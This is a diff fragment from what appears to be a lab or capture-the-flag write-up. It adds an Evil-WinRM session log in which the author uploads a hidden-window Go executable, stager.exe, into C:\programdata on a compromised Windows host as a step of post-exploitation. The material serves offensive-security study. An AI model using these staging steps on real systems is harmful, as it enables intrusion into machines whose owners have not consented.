@@ -1000,5 +1000,19 @@ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-H windowsgui" -o sta
 This compiled it into stager.exe
 
 ```python
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> cd C:\programdata
+*Evil-WinRM* PS C:\programdata> upload stager.exe
+                                        
+Info: Uploading /home/kali/hsm/CTOS/stager.exe to C:\programdata\stager.exe
+                                        
+Data: 11358888 bytes of 11358888 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\programdata
+```
+
+Ill upload it to programdata
+
+```python
 
 ```
